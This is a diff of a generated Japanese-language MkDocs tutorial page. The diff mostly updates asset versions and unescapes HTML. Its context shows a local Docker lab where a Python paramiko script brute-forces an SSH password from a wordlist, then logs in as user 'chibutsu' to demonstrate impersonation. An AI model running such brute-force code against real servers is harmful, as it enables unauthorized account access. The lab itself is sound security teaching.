@@ -19,7 +19,7 @@
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
-      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.8.0">
     
     
       
@@ -27,10 +27,10 @@
       
     
     
-      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      <link rel="stylesheet" href="../../assets/stylesheets/main.57a0d79d.min.css">
       
         
-        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.fb2fffe2.min.css">
       
       
 
@@ -1436,19 +1436,19 @@ ICTが全くない状況を想像した上で現代と比較すれば、答え�
 </code></pre></div>
 上手くいけば、以下のようなメッセージが表示されるはずです。
 <div class="highlight" style="background: #f8f8f8"><pre style="line-height: 125%;"><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>dockerコンテナの準備が完了しました。
-<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>&#39;ssh ユーザー名@localhost -p 22222&#39;でSSHログインができます。
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>'ssh ユーザー名@localhost -p 22222'でSSHログインができます。
 </code></pre></div></p>
 <p>試しにSSHしてみましょう。パスワードは今のところ分からないはずなので、適当に入力してください。
 <div class="highlight" style="background: #f8f8f8"><pre style="line-height: 125%;"><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>$ ssh chibutsu@localhost -p 22222
-<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>The authenticity of host &#39;[localhost]:22222 ([::1]:22222)&#39; can&#39;t be established.
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>The authenticity of host '[localhost]:22222 ([::1]:22222)' can't be established.
 <a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>ECDSA key fingerprint is SHA256:7CsZMUdMUJCx9qX89ZxRaUj2s8u8MBnuB2NUFZK+W4A.
 <a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>Warning: Permanently added &#39;[localhost]:22222&#39; (ECDSA) to the list of known hosts.
-<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>chibutsu@localhost&#39;s password: 
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>Warning: Permanently added '[localhost]:22222' (ECDSA) to the list of known hosts.
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>chibutsu@localhost's password: 
 <a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>Permission denied, please try again.
-<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>chibutsu@localhost&#39;s password: 
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>chibutsu@localhost's password: 
 <a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>Permission denied, please try again.
-<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>chibutsu@localhost&#39;s password: 
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>chibutsu@localhost's password: 
 <a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>chibutsu@localhost: Permission denied (publickey,password).
 </code></pre></div>
 当たり前ですが、パスワードが分からないのでログインできません。</p>
@@ -1472,22 +1472,22 @@ ICTが全くない状況を想像した上で現代と比較すれば、答え�
 <a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>import sys
 <a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>
 <a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
-<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>passwords_path = &quot;passwords.txt&quot; # パスワードリストの場所
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>passwords_path = "passwords.txt" # パスワードリストの場所
 <a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
 <a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a># ssh ユーザー名@localhost -p 22222
-<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>HOST = &quot;localhost&quot; # SSH接続先
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>HOST = "localhost" # SSH接続先
 <a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>PORT = 22222 # SSH接続のためのポート番号。今回は22222。
-<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>USER = &quot;chibutsu&quot; # ユーザー名
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>USER = "chibutsu" # ユーザー名
 <a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>
 <a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a># パスワードリストからパスワードを読み込んでSSH接続を試みる。
 <a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a># 接続が成功したらプログラムを終了させる。
 <a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a># 失敗したら次のパスワードを試す。
-<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>with open(passwords_path, &quot;r&quot;) as file:
+<a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>with open(passwords_path, "r") as file:
 <a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>
 <a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>    for PASSWORD in file:
 <a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>
 <a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>        # 改行コードを取り除く
-<a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>        PASSWORD = PASSWORD.replace(&quot;\n&quot;, &quot;&quot;)
+<a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>        PASSWORD = PASSWORD.replace("\n", "")
 <a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>
 <a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a>        ssh = paramiko.SSHClient()
 <a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a>        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -1495,13 +1495,13 @@ ICTが全くない状況を想像した上で現代と比較すれば、答え�
 <a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a>        try:
 <a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a>            ssh.connect(hostname=HOST, port=PORT, username=USER, password=PASSWORD)
 <a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a>            print()
-<a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a>            print(&quot;SUCCESS!&quot;)
-<a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a>            print(f&quot;username : {USER}&quot;)
-<a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a>            print(f&quot;password : {PASSWORD}&quot;)
+<a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a>            print("SUCCESS!")
+<a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a>            print(f"username : {USER}")
+<a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a>            print(f"password : {PASSWORD}")
 <a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a>
 <a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a>            sys.exit()
 <a id="__codelineno-3-36" name="__codelineno-3-36" href="#__codelineno-3-36"></a>        except paramiko.AuthenticationException:
-<a id="__codelineno-3-37" name="__codelineno-3-37" href="#__codelineno-3-37"></a>            print(f&quot;{PASSWORD} is not correct&quot;)
+<a id="__codelineno-3-37" name="__codelineno-3-37" href="#__codelineno-3-37"></a>            print(f"{PASSWORD} is not correct")
 <a id="__codelineno-3-38" name="__codelineno-3-38" href="#__codelineno-3-38"></a>        finally:
 <a id="__codelineno-3-39" name="__codelineno-3-39" href="#__codelineno-3-39"></a>            ssh.close()
 </code></pre></div>
@@ -1524,7 +1524,7 @@ ICTが全くない状況を想像した上で現代と比較すれば、答え�
 </code></pre></div></p>
 <p>早速パスワードを用いて、SSHログインを試みます。
 <div class="highlight" style="background: #f8f8f8"><pre style="line-height: 125%;"><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>$ ssh chibutsu@localhost -p 22222
-<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>chibutsu@localhost&#39;s password:  # &quot;aurora&quot;と入力
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>chibutsu@localhost's password:  # "aurora"と入力
 <a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 6.5.0-1017-azure x86_64)
 <a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
 <a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a> * Documentation:  https://help.ubuntu.com
@@ -1533,7 +1533,7 @@ ICTが全くない状況を想像した上で現代と比較すれば、答え�
 <a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>This system has been minimized by removing packages and content that are
 <a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>not required on a system that users do not log into.
 <a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>
-<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>To restore this content, you can run the &#39;unminimize&#39; command.
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>To restore this content, you can run the 'unminimize' command.
 <a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>chibutsu@960522125acf:~$ 
 </code></pre></div></p>
 <p>これで不正ログイン完了です。「chibutsu」さんになりすますことができました。<br />
@@ -1634,10 +1634,10 @@ ICTが全くない状況を想像した上で現代と比較すれば、答え�
     
       
       
-      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.top"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "\u30b3\u30d4\u30fc\u3057\u307e\u3057\u305f", "clipboard.copy": "\u30af\u30ea\u30c3\u30d7\u30dc\u30fc\u30c9\u3078\u30b3\u30d4\u30fc", "search.result.more.one": "\u3053\u306e\u30da\u30fc\u30b8\u5185\u306b\u3082\u30461\u4ef6\u898b\u3064\u304b\u308a\u307e\u3057\u305f", "search.result.more.other": "\u3053\u306e\u30da\u30fc\u30b8\u5185\u306b\u3042\u3068#\u4ef6\u898b\u3064\u304b\u308a\u307e\u3057\u305f", "search.result.none": "\u4f55\u3082\u898b\u3064\u304b\u308a\u307e\u305b\u3093\u3067\u3057\u305f", "search.result.one": "1\u4ef6\u898b\u3064\u304b\u308a\u307e\u3057\u305f", "search.result.other": "#\u4ef6\u898b\u3064\u304b\u308a\u307e\u3057\u305f", "search.result.placeholder": "\u691c\u7d22\u30ad\u30fc\u30ef\u30fc\u30c9\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044", "search.result.term.missing": "\u691c\u7d22\u306b\u542b\u307e\u308c\u306a\u3044", "select.version": "\u30d0\u30fc\u30b8\u30e7\u30f3\u5207\u308a\u66ff\u3048"}, "version": null}</script>
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.top"], "search": "../../assets/javascripts/workers/search.a7633da7.min.js", "tags": null, "translations": {"clipboard.copied": "\u30b3\u30d4\u30fc\u3057\u307e\u3057\u305f", "clipboard.copy": "\u30af\u30ea\u30c3\u30d7\u30dc\u30fc\u30c9\u3078\u30b3\u30d4\u30fc", "search.result.more.one": "\u3053\u306e\u30da\u30fc\u30b8\u5185\u306b\u3082\u30461\u4ef6\u898b\u3064\u304b\u308a\u307e\u3057\u305f", "search.result.more.other": "\u3053\u306e\u30da\u30fc\u30b8\u5185\u306b\u3042\u3068#\u4ef6\u898b\u3064\u304b\u308a\u307e\u3057\u305f", "search.result.none": "\u4f55\u3082\u898b\u3064\u304b\u308a\u307e\u305b\u3093\u3067\u3057\u305f", "search.result.one": "1\u4ef6\u898b\u3064\u304b\u308a\u307e\u3057\u305f", "search.result.other": "#\u4ef6\u898b\u3064\u304b\u308a\u307e\u3057\u305f", "search.result.placeholder": "\u691c\u7d22\u30ad\u30fc\u30ef\u30fc\u30c9\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044", "search.result.term.missing": "\u691c\u7d22\u306b\u542b\u307e\u308c\u306a\u3044", "select.version": "\u30d0\u30fc\u30b8\u30e7\u30f3\u5207\u308a\u66ff\u3048"}, "version": null}</script>
     
     
-      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      <script src="../../assets/javascripts/bundle.c21346df.min.js"></script>
       
         <script src="../../js/mathjax.js"></script>
       
